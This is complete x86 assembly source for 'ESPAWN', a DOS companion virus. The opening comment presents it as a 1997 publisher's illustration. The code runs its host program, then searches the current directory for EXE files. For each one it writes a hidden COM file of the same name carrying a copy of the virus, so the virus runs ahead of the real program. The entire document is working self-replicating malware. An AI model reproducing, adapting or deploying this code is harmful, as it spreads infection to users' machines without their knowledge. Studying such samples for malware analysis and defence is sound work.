;The ESPAWN virus is a simple companion virus to illustrate a companion virus
;that attacks EXEs by creating a hidden COM with the same name.
;
;(C) 1997 American Eagle Publications, Inc. All Rights Reserved!

.model  tiny
.code
                org     0100h

ESPAWN:
                mov     sp,OFFSET FINISH + 100H         ;Change top of stack
                mov     ah,4AH                          ;DOS resize memory fctn
                mov     bx,sp
                mov     cl,4
                shr     bx,cl
                inc     bx                              ;BX holds # of para to keep
                int     21H

                mov     bx,2CH                          ;set up EXEC param block
                mov     ax,[bx]
                mov     WORD PTR [PARAM_BLK],ax         ;environment segment
                mov     ax,cs
                mov     WORD PTR [PARAM_BLK+4],ax       ;@ of parameter string
                mov     WORD PTR [PARAM_BLK+8],ax       ;@ of FCB1
                mov     WORD PTR [PARAM_BLK+12],ax      ;@ of FCB2

                mov     dx,OFFSET REAL_NAME     ;prep to EXEC
                mov     bx,OFFSET PARAM_BLK
                mov     ax,4B00H
                int     21H                     ;execute host

                cli
                mov     bx,ax                   ;save return code here
                mov     ax,cs                   ;AX holds code segment
                mov     ss,ax                   ;restore stack first
                mov     sp,(FINISH - ESPAWN) + 200H
                sti
                push    bx
                mov     ds,ax                   ;Restore data segment
                mov     es,ax                   ;Restore extra segment

                mov     ah,1AH                  ;DOS set DTA function
                mov     dx,80H                  ;put DTA at offset 80H
                int     21H
                call    FIND_FILES              ;Find and infect files

                pop     ax                      ;AL holds return value
                mov     ah,4CH                  ;DOS terminate function
                int     21H                     ;bye-bye


;The following routine searches for EXE files and infects them
FIND_FILES:
                mov     dx,OFFSET EXE_MASK      ;search for EXE files
                mov     ah,4EH                  ;DOS find first file function
                xor     cx,cx                   ;CX holds all file attributes
FIND_LOOP:      int     21H
                jc      FIND_DONE               ;Exit if no files found
                call    INFECT_FILE             ;Infect the file!
                mov     ah,4FH                  ;DOS find next file function
                jmp     FIND_LOOP               ;Try finding another file
FIND_DONE:      ret                             ;Return to caller

EXE_MASK        db      '*.EXE',0               ;EXE file search mask

;This routine infects the file specified in the DTA.
INFECT_FILE:
                mov     si,9EH                  ;DTA + 1EH
                mov     di,OFFSET REAL_NAME     ;DI points to new name
INF_LOOP:       lodsb                           ;Load a character
                stosb                           ;and save it in buffer
                or      al,al                   ;Is it a NULL?
                jnz     INF_LOOP                ;If so then leave the loop
                mov     WORD PTR [si-4],'OC'    ;change name of file to create
                mov     WORD PTR [si-2],'M'     ;to COM
                mov     dx,9EH                  ;DTA + 1EH = file name
                mov     ah,3CH                  ;DOS create file function
                mov     cx,2                    ;set hidden attribute
                int     21H
                jc      INF_EXIT
                mov     bx,ax                   ;BX holds file handle

                mov     ah,40H                  ;DOS write to file function
                mov     cx,FINISH - ESPAWN      ;CX holds virus length
                mov     dx,OFFSET ESPAWN        ;DX points to ESPAWN of virus
                int     21H

                mov     ah,3EH                  ;DOS close file function
                int     21H
INF_EXIT:       ret

REAL_NAME       db      13 dup (?)              ;Name of host to execute (EXE)

;DOS EXEC function parameter block
PARAM_BLK       DW      ?                       ;environment segment
                DD      80H                     ;@ of command line
                DD      5CH                     ;@ of first FCB
                DD      6CH                     ;@ of second FCB

FINISH:

                end     ESPAWN
